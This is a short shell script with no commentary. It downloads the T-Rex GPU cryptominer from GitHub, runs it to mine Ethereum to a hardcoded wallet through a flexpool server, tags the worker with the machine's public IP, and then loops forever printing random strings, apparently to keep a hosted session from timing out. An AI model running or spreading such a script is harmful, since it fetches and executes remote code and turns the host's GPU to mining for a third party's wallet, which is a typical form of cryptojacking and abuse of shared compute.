sudo apt update
sudo apt-get install zip unzip
sudo apt install libpci3
wget -nv -c https://github.com/trexminer/T-Rex/releases/download/0.26.1/t-rex-0.26.1-linux.tar.gz -O - | tar -xz
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo LD_PRELOAD="" ./t-rex -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -p x -w $ip-TX --keep-gpu-busy 
while [ 1 ]; do
  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
sleep 2
done
